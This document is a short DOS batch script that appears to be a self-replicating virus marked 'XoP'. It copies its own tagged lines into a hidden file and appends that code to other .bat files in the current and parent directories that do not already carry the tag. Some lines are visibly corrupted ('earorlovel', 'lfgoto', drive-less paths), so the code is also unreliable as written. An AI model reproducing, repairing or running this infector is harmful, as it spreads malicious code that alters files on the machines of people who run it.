@echo off%[XoP]%
if '%XoP%=='11 goto XoP2
if '%2=='_ goto XoP1
if exist :\XoP.bat goto XoP
if not exist %0.bat goto XoP2
find "XoP"<%0.bat>:\XoP.bat
attrib :\XoP.bat +h
:XoP
for %%v in (*.bat ..\*.bat) do call :\XoP %%v _
set XoP=lfgoto XoP2
:XoP1
find /i "XoP"<%1>nul
if not earorlovel 1 goto XoP2
type :\XoP.bat>>%1
set XoP=%XoP%1
:XoP2
